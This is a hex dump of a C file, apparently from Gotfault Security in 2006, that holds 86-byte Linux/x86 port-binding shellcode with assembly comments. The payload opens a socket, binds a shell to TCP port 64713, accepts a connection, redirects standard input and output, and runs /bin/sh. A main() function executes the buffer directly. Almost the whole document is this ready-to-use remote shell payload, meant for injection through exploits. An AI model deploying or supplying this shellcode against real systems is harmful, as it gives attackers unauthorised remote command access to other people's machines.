00000000  2f 2a 20 0d 0a 20 2a 20  6c 69 6e 75 78 2d 78 38  |/* .. * linux-x8|
00000010  36 2d 70 6f 72 74 62 69  6e 64 2e 63 20 2d 20 70  |6-portbind.c - p|
00000020  6f 72 74 62 69 6e 64 20  73 68 65 6c 6c 63 6f 64  |ortbind shellcod|
00000030  65 20 38 36 20 62 79 74  65 73 20 66 6f 72 20 4c  |e 86 bytes for L|
00000040  69 6e 75 78 2f 78 38 36  0d 0a 20 2a 20 43 6f 70  |inux/x86.. * Cop|
00000050  79 72 69 67 68 74 20 28  63 29 20 32 30 30 36 20  |yright (c) 2006 |
00000060  47 6f 74 66 61 75 6c 74  20 53 65 63 75 72 69 74  |Gotfault Securit|
00000070  79 20 3c 78 67 63 40 67  6f 74 66 61 75 6c 74 2e  |y <xgc@gotfault.|
00000080  6e 65 74 3e 0d 0a 20 2a  20 0d 0a 20 2a 20 70 6f  |net>.. * .. * po|
00000090  72 74 62 69 6e 64 20 73  68 65 6c 6c 63 6f 64 65  |rtbind shellcode|
000000a0  20 74 68 61 74 20 62 69  6e 64 28 29 27 73 20 61  | that bind()'s a|
000000b0  20 73 68 65 6c 6c 20 6f  6e 20 70 6f 72 74 20 36  | shell on port 6|
000000c0  34 37 31 33 2f 74 63 70  0d 0a 20 2a 0d 0a 20 2a  |4713/tcp.. *.. *|
000000d0  2f 0d 0a 0d 0a 63 68 61  72 20 73 68 65 6c 6c 63  |/....char shellc|
000000e0  6f 64 65 5b 5d 20 3d 20  0d 0a 0d 0a 20 20 2f 2a  |ode[] = ....  /*|
000000f0  20 73 6f 63 6b 65 74 28  41 46 5f 49 4e 45 54 2c  | socket(AF_INET,|
00000100  20 53 4f 43 4b 5f 53 54  52 45 41 4d 2c 20 30 29  | SOCK_STREAM, 0)|
00000110  20 2a 2f 0d 0a 0d 0a 20  20 22 5c 78 36 61 5c 78  | */....  "\x6a\x|
00000120  36 36 22 09 09 09 2f 2f  20 70 75 73 68 20 20 20  |66"...// push   |
00000130  24 30 78 36 36 0d 0a 20  20 22 5c 78 35 38 22 09  |$0x66..  "\x58".|
00000140  09 09 2f 2f 20 70 6f 70  20 20 20 20 25 65 61 78  |..// pop    %eax|
00000150  0d 0a 20 20 22 5c 78 36  61 5c 78 30 31 22 09 09  |..  "\x6a\x01"..|
00000160  09 2f 2f 20 70 75 73 68  20 20 20 24 30 78 31 0d  |.// push   $0x1.|
00000170  0a 20 20 22 5c 78 35 62  22 09 09 09 2f 2f 20 70  |.  "\x5b"...// p|
00000180  6f 70 20 20 20 20 25 65  62 78 0d 0a 20 20 22 5c  |op    %ebx..  "\|
00000190  78 39 39 22 09 09 09 2f  2f 20 63 6c 74 64 0d 0a  |x99"...// cltd..|
000001a0  20 20 22 5c 78 35 32 22  09 09 09 2f 2f 20 70 75  |  "\x52"...// pu|
000001b0  73 68 20 20 20 25 65 64  78 0d 0a 20 20 22 5c 78  |sh   %edx..  "\x|
000001c0  35 33 22 09 09 09 2f 2f  20 70 75 73 68 20 20 20  |53"...// push   |
000001d0  25 65 62 78 0d 0a 20 20  22 5c 78 36 61 5c 78 30  |%ebx..  "\x6a\x0|
000001e0  32 22 09 09 09 2f 2f 20  70 75 73 68 20 20 20 24  |2"...// push   $|
000001f0  30 78 32 0d 0a 20 20 22  5c 78 38 39 5c 78 65 31  |0x2..  "\x89\xe1|
00000200  22 09 09 09 2f 2f 20 6d  6f 76 20 20 20 20 25 65  |"...// mov    %e|
00000210  73 70 2c 25 65 63 78 0d  0a 20 20 22 5c 78 63 64  |sp,%ecx..  "\xcd|
00000220  5c 78 38 30 22 09 09 09  2f 2f 20 69 6e 74 20 20  |\x80"...// int  |
00000230  20 20 24 30 78 38 30 0d  0a 0d 0a 20 20 2f 2a 20  |  $0x80....  /* |
00000240  62 69 6e 64 28 73 2c 20  73 65 72 76 65 72 2c 20  |bind(s, server, |
00000250  73 69 7a 65 6f 66 28 73  65 72 76 65 72 29 29 20  |sizeof(server)) |
00000260  2a 2f 0d 0a 0d 0a 20 20  22 5c 78 35 32 22 09 09  |*/....  "\x52"..|
00000270  09 2f 2f 20 70 75 73 68  20 20 20 25 65 64 78 0d  |.// push   %edx.|
00000280  0a 20 20 22 5c 78 36 36  5c 78 36 38 5c 78 66 63  |.  "\x66\x68\xfc|
00000290  5c 78 63 39 22 09 09 2f  2f 20 70 75 73 68 77 20  |\xc9"..// pushw |
000002a0  20 24 30 78 63 39 66 63  20 20 2f 2f 20 50 4f 52  | $0xc9fc  // POR|
000002b0  54 20 3d 20 36 34 37 31  33 0d 0a 20 20 22 5c 78  |T = 64713..  "\x|
000002c0  36 36 5c 78 36 61 5c 78  30 32 22 09 09 2f 2f 20  |66\x6a\x02"..// |
000002d0  70 75 73 68 77 20 20 24  30 78 32 0d 0a 20 20 22  |pushw  $0x2..  "|
000002e0  5c 78 38 39 5c 78 65 31  22 09 09 09 2f 2f 20 6d  |\x89\xe1"...// m|
000002f0  6f 76 20 20 20 20 24 65  73 70 2c 25 65 63 78 0d  |ov    $esp,%ecx.|
00000300  0a 20 20 22 5c 78 36 61  5c 78 31 30 22 09 09 09  |.  "\x6a\x10"...|
00000310  2f 2f 20 70 75 73 68 20  20 20 24 30 78 31 30 0d  |// push   $0x10.|
00000320  0a 20 20 22 5c 78 35 31  22 09 09 09 2f 2f 20 70  |.  "\x51"...// p|
00000330  75 73 68 20 20 20 25 65  63 78 0d 0a 20 20 22 5c  |ush   %ecx..  "\|
00000340  78 35 30 22 09 09 09 2f  2f 20 70 75 73 68 20 20  |x50"...// push  |
00000350  20 25 65 61 78 0d 0a 20  20 22 5c 78 38 39 5c 78  | %eax..  "\x89\x|
00000360  65 31 22 09 09 09 2f 2f  20 6d 6f 76 20 20 20 20  |e1"...// mov    |
00000370  25 65 73 70 2c 25 65 63  78 0d 0a 20 20 22 5c 78  |%esp,%ecx..  "\x|
00000380  38 39 5c 78 63 36 22 09  09 09 2f 2f 20 6d 6f 76  |89\xc6"...// mov|
00000390  20 20 20 20 25 65 61 78  2c 25 65 73 69 0d 0a 20  |    %eax,%esi.. |
000003a0  20 22 5c 78 34 33 22 09  09 09 2f 2f 20 69 6e 63  | "\x43"...// inc|
000003b0  20 20 20 20 25 65 62 78  0d 0a 20 20 22 5c 78 62  |    %ebx..  "\xb|
000003c0  30 5c 78 36 36 22 09 09  09 2f 2f 20 6d 6f 76 20  |0\x66"...// mov |
000003d0  20 20 20 24 30 78 36 36  2c 25 61 6c 0d 0a 20 20  |   $0x66,%al..  |
000003e0  22 5c 78 63 64 5c 78 38  30 22 09 09 09 2f 2f 20  |"\xcd\x80"...// |
000003f0  69 6e 74 20 20 20 20 24  30 78 38 30 0d 0a 0d 0a  |int    $0x80....|
00000400  20 20 2f 2a 20 6c 69 73  74 65 6e 28 73 2c 20 61  |  /* listen(s, a|
00000410  6e 79 74 68 69 6e 67 29  20 2a 2f 0d 0a 0d 0a 20  |nything) */.... |
00000420  20 22 5c 78 62 30 5c 78  36 36 22 09 09 09 2f 2f  | "\xb0\x66"...//|
00000430  20 6d 6f 76 20 20 20 20  24 30 78 36 36 2c 25 61  | mov    $0x66,%a|
00000440  6c 0d 0a 20 20 22 5c 78  64 31 5c 78 65 33 22 09  |l..  "\xd1\xe3".|
00000450  09 09 2f 2f 20 73 68 6c  20 20 20 20 25 65 62 78  |..// shl    %ebx|
00000460  0d 0a 20 20 22 5c 78 63  64 5c 78 38 30 22 09 09  |..  "\xcd\x80"..|
00000470  09 2f 2f 20 69 6e 74 20  20 20 20 24 30 78 38 30  |.// int    $0x80|
00000480  0d 0a 0d 0a 20 20 2f 2a  20 61 63 63 65 70 74 28  |....  /* accept(|
00000490  73 2c 20 30 2c 20 30 29  20 2a 2f 0d 0a 0d 0a 20  |s, 0, 0) */.... |
000004a0  20 22 5c 78 35 32 22 09  09 09 2f 2f 20 70 75 73  | "\x52"...// pus|
000004b0  68 20 20 20 25 65 64 78  0d 0a 20 20 22 5c 78 35  |h   %edx..  "\x5|
000004c0  36 22 09 09 09 2f 2f 20  70 75 73 68 20 20 20 25  |6"...// push   %|
000004d0  65 73 69 0d 0a 20 20 22  5c 78 38 39 5c 78 65 31  |esi..  "\x89\xe1|
000004e0  22 09 09 09 2f 2f 20 6d  6f 76 20 20 20 20 25 65  |"...// mov    %e|
000004f0  73 70 2c 25 65 63 78 0d  0a 20 20 22 5c 78 34 33  |sp,%ecx..  "\x43|
00000500  22 09 09 09 2f 2f 20 69  6e 63 20 20 20 20 25 65  |"...// inc    %e|
00000510  62 78 0d 0a 20 20 22 5c  78 62 30 5c 78 36 36 22  |bx..  "\xb0\x66"|
00000520  09 09 09 2f 2f 20 6d 6f  76 20 20 20 20 24 30 78  |...// mov    $0x|
00000530  36 36 2c 25 61 6c 0d 0a  20 20 22 5c 78 63 64 5c  |66,%al..  "\xcd\|
00000540  78 38 30 22 09 09 09 2f  2f 20 69 6e 74 20 20 20  |x80"...// int   |
00000550  20 24 30 78 38 30 0d 0a  0d 0a 20 20 22 5c 78 39  | $0x80....  "\x9|
00000560  33 22 09 09 09 2f 2f 20  78 63 68 67 20 20 20 25  |3"...// xchg   %|
00000570  65 61 78 2c 25 65 62 78  0d 0a 0d 0a 20 20 2f 2a  |eax,%ebx....  /*|
00000580  20 64 75 70 32 28 63 2c  20 32 29 20 2c 20 64 75  | dup2(c, 2) , du|
00000590  70 32 28 63 2c 20 31 29  20 2c 20 64 75 70 32 28  |p2(c, 1) , dup2(|
000005a0  63 2c 20 30 29 20 2a 2f  0d 0a 0d 0a 20 20 22 5c  |c, 0) */....  "\|
000005b0  78 36 61 5c 78 30 32 22  09 09 09 2f 2f 20 70 75  |x6a\x02"...// pu|
000005c0  73 68 20 20 20 24 30 78  32 0d 0a 20 20 22 5c 78  |sh   $0x2..  "\x|
000005d0  35 39 22 09 09 09 2f 2f  20 70 6f 70 20 20 20 20  |59"...// pop    |
000005e0  25 65 63 78 0d 0a 0d 0a  20 20 22 5c 78 62 30 5c  |%ecx....  "\xb0\|
000005f0  78 33 66 22 09 09 09 2f  2f 20 6d 6f 76 20 20 20  |x3f"...// mov   |
00000600  20 24 30 78 33 66 2c 25  61 6c 0d 0a 20 20 22 5c  | $0x3f,%al..  "\|
00000610  78 63 64 5c 78 38 30 22  09 09 09 2f 2f 20 69 6e  |xcd\x80"...// in|
00000620  74 20 20 20 20 24 30 78  38 30 0d 0a 20 20 22 5c  |t    $0x80..  "\|
00000630  78 34 39 22 09 09 09 2f  2f 20 64 65 63 20 20 20  |x49"...// dec   |
00000640  20 25 65 63 78 0d 0a 20  20 22 5c 78 37 39 5c 78  | %ecx..  "\x79\x|
00000650  66 39 22 09 09 09 2f 2f  20 6a 6e 73 20 20 20 20  |f9"...// jns    |
00000660  64 75 70 5f 6c 6f 6f 70  0d 0a 0d 0a 20 20 2f 2a  |dup_loop....  /*|
00000670  20 65 78 65 63 76 65 28  22 2f 62 69 6e 2f 73 68  | execve("/bin/sh|
00000680  22 2c 20 5b 22 2f 62 69  6e 2f 73 68 22 5d 2c 20  |", ["/bin/sh"], |
00000690  4e 55 4c 4c 29 20 2a 2f  0d 0a 0d 0a 20 20 22 5c  |NULL) */....  "\|
000006a0  78 36 61 5c 78 30 62 22  09 09 09 2f 2f 20 70 75  |x6a\x0b"...// pu|
000006b0  73 68 20 20 20 24 30 78  62 0d 0a 20 20 22 5c 78  |sh   $0xb..  "\x|
000006c0  35 38 22 09 09 09 2f 2f  20 70 6f 70 20 20 20 20  |58"...// pop    |
000006d0  25 65 61 78 0d 0a 20 20  22 5c 78 35 32 22 09 09  |%eax..  "\x52"..|
000006e0  09 2f 2f 20 70 75 73 68  20 20 20 25 65 64 78 0d  |.// push   %edx.|
000006f0  0a 20 20 22 5c 78 36 38  5c 78 32 66 5c 78 32 66  |.  "\x68\x2f\x2f|
00000700  5c 78 37 33 5c 78 36 38  22 09 2f 2f 20 70 75 73  |\x73\x68".// pus|
00000710  68 20 20 20 24 30 78 36  38 37 33 32 66 32 66 0d  |h   $0x68732f2f.|
00000720  0a 20 20 22 5c 78 36 38  5c 78 32 66 5c 78 36 32  |.  "\x68\x2f\x62|
00000730  5c 78 36 39 5c 78 36 65  22 09 2f 2f 20 70 75 73  |\x69\x6e".// pus|
00000740  68 20 20 20 24 30 78 36  65 36 39 36 32 32 66 0d  |h   $0x6e69622f.|
00000750  0a 20 20 22 5c 78 38 39  5c 78 65 33 22 09 09 09  |.  "\x89\xe3"...|
00000760  2f 2f 20 6d 6f 76 20 20  20 20 25 65 73 70 2c 20  |// mov    %esp, |
00000770  25 65 62 78 0d 0a 20 20  22 5c 78 35 32 22 09 09  |%ebx..  "\x52"..|
00000780  09 2f 2f 20 70 75 73 68  20 20 20 25 65 64 78 0d  |.// push   %edx.|
00000790  0a 20 20 22 5c 78 35 33  22 09 09 09 2f 2f 20 70  |.  "\x53"...// p|
000007a0  75 73 68 20 20 20 25 65  62 78 0d 0a 20 20 22 5c  |ush   %ebx..  "\|
000007b0  78 38 39 5c 78 65 31 22  09 09 09 2f 2f 20 6d 6f  |x89\xe1"...// mo|
000007c0  76 20 20 20 20 25 65 73  70 2c 20 25 65 63 78 0d  |v    %esp, %ecx.|
000007d0  0a 20 20 22 5c 78 63 64  5c 78 38 30 22 3b 09 09  |.  "\xcd\x80";..|
000007e0  09 2f 2f 20 69 6e 74 20  20 20 20 24 30 78 38 30  |.// int    $0x80|
000007f0  0d 0a 0d 0a 69 6e 74 20  6d 61 69 6e 28 29 20 7b  |....int main() {|
00000800  0d 0a 20 0d 0a 20 20 20  20 20 20 20 20 69 6e 74  |.. ..        int|
00000810  20 28 2a 66 29 28 29 20  3d 20 28 69 6e 74 28 2a  | (*f)() = (int(*|
00000820  29 28 29 29 73 68 65 6c  6c 63 6f 64 65 3b 0d 0a  |)())shellcode;..|
00000830  20 20 20 20 20 20 20 20  70 72 69 6e 74 66 28 22  |        printf("|
00000840  4c 65 6e 67 74 68 3a 20  25 75 5c 6e 22 2c 20 73  |Length: %u\n", s|
00000850  74 72 6c 65 6e 28 73 68  65 6c 6c 63 6f 64 65 29  |trlen(shellcode)|
00000860  29 3b 0d 0a 20 20 20 20  20 20 20 20 66 28 29 3b  |);..        f();|
00000870  0d 0a 7d                                          |..}|
00000873
